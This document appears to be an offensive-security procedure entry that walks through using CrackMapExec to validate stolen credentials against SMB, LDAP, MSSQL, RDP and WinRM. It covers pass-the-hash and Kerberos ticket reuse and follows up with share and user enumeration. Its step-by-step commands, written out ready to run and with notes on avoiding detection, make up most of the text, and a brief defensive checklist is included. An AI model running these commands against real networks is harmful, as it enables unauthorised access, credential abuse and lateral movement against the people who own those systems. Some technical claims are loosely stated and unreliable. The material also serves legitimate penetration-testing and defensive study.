---
id: 49100454-f45c-4427-b865-7d85dc6cb042
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.735392+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Brute Force|T1110 - Brute Force]]'
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
sub_techniques: []
tags:
  - '[[tags/Crackmapexec]]'
  - '[[tags/Windows - Using credentials]]'
  - credential-testing
  - smb
  - active-directory
commands:
  - '[[commands/crackmapexec-ldap-with-nt-hash]]'
  - '[[commands/crackmapexec-mssql-with-nt-hash]]'
  - '[[commands/crackmapexec-rdp-with-nt-hash]]'
  - '[[commands/crackmapexec-smb-with-nt-hash]]'
  - '[[commands/crackmapexec-winrm-with-nt-hash]]'
  - '[[commands/crackmapexec-smb-with-password]]'
  - '[[commands/crackmapexec-smb-with-kerberos]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/CrackMapExec]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec

## Summary

This procedure uses CrackMapExec to validate stolen or guessed credentials against multiple Windows protocols including SMB, LDAP, MSSQL, RDP, and WinRM. It supports authentication via plaintext passwords, NT hashes, or Kerberos tickets, enabling efficient credential testing across a target network to identify valid access for further exploitation such as lateral movement or data access.

## Description

In an attack scenario, adversaries often obtain credentials through methods like phishing, keylogging, or dumping from compromised systems. This procedure automates testing these credentials against common Windows services using CrackMapExec, a post-exploitation tool that sprays credentials across protocols without triggering excessive alerts. It is particularly useful in Active Directory environments to confirm usability of credentials for SMB shares, remote administration, or database access. The target environment is typically a Windows domain network with services exposed on ports like 445 (SMB), 389 (LDAP), 1433 (MSSQL), 3389 (RDP), and 5985 (WinRM). Success allows attackers to map accessible hosts and escalate to actions like file enumeration or command execution. Prerequisites include network access to the targets and possession of potential credentials.

## Requirements

1. Network connectivity to target hosts (e.g., via VPN or compromised foothold).
2. Valid or guessed credentials (username, password, NT hash, or Kerberos ticket).
3. Installed CrackMapExec tool on the attacker's machine.
4. Python 3 and dependencies like Impacket for CrackMapExec functionality.
5. Target hosts running Windows services (SMBv2+, Active Directory domain).

## Defense

- Implement account lockout policies after failed login attempts to deter brute-force testing.
- Enable multi-factor authentication (MFA) for all services, especially remote access like RDP and WinRM.
- Monitor authentication logs (Event ID 4625 for failures, 4624 for successes) and network traffic for anomalous connection patterns to multiple ports.
- Use network segmentation to limit lateral movement and deploy tools like Microsoft Defender for Identity to detect credential abuse.
- Regularly rotate credentials and enforce least-privilege access to reduce impact of compromised accounts.

## Objectives

1. Validate credential validity across SMB, LDAP, MSSQL, RDP, and WinRM protocols.
2. Identify accessible hosts and services for potential lateral movement or data exfiltration.
3. Confirm authentication methods (password, hash, Kerberos) that work against targets.
4. Gather host details like OS version, domain, and share information upon successful auth.

## Instructions

### Step 1: Test Credentials Across Multiple Protocols Using NT Hash

**Context**: Begin by batch-testing a known NT hash against all supported protocols on a single target to quickly assess credential usability. This step uses a multi-command script to parallelize checks and minimize execution time. Why: It provides a broad validation without repeated tool invocations, revealing which services the credential unlocks.

**Code** ([[codes/Multi-Protocol-Credential-Test-with-NT-Hash]]):

```bash
crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
crackmapexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
crackmapexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

> This script executes CrackMapExec for each protocol using the provided NT hash. Replace the IP, username, and hash as needed. If valid, expect green [+] indicators with host details; red [-] for failures. Decision point: If SMB succeeds but others fail, focus on file share access next; if all fail, try alternative credentials.

### Step 2: Test SMB Specifically with Plaintext Password

**Context**: If NT hash testing fails or is unavailable, test SMB authentication with a plaintext password. This is common for initial credential sprays. Why: SMB is often the entry point for share enumeration, and plaintext avoids hash cracking overhead.

**Command** ([[commands/crackmapexec-smb-with-password]]):

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -p "$_PASSWORD"
```

> Run this to attempt SMB login. Success grants share listing and potential execution rights. If the password contains special characters, ensure proper quoting.

### Step 3: Test SMB with NT Hash

**Context**: Use a pre-cracked NT hash for pass-the-hash attacks, bypassing password prompts. Why: Hashes are often dumped from memory (e.g., via Mimikatz) and allow silent auth without alerting password-based logging.

**Command** ([[commands/crackmapexec-smb-with-nt-hash]]):

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

> The colon before the hash is required. This tests NTLMv2 compatibility. Upon success, enumerate shares with --shares flag (add if needed).

### Step 4: Test SMB with Kerberos Authentication

**Context**: Leverage a Kerberos ticket (e.g., from silver ticket forging) for ticket-based auth. Why: Kerberos avoids NTLM challenges, reducing detection in monitored environments, and is ideal for domain-joined attacks.

**Command** ([[commands/crackmapexec-smb-with-kerberos]]):

```bash
export KRB5CCNAME=$_KERBEROS_CCACHE; crackmapexec smb $_TARGET_IP -u $_USERNAME --use-kcache
```

> Export the Kerberos cache file path first. This assumes a valid TGT/CCACHE. If no ticket, obtain one via tools like Rubeus. Decision point: If Kerberos fails due to ticket expiration, fall back to hash or password methods.

### Step 5: Validate and Enumerate Successful Protocols

**Context**: For any successful protocol, extend testing to gather more intel (e.g., shares, users). Why: Validation alone doesn't exploit; follow-up reveals attack paths like accessible files or remote execution.

**Command** (Example for SMB, adapt for others):

Use [[commands/crackmapexec-smb-with-nt-hash]] with added flags:

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH" --shares
```

> This lists accessible shares. For LDAP, add --users to enumerate accounts. Review outputs for admin rights or domain info to guide next actions like lateral movement.
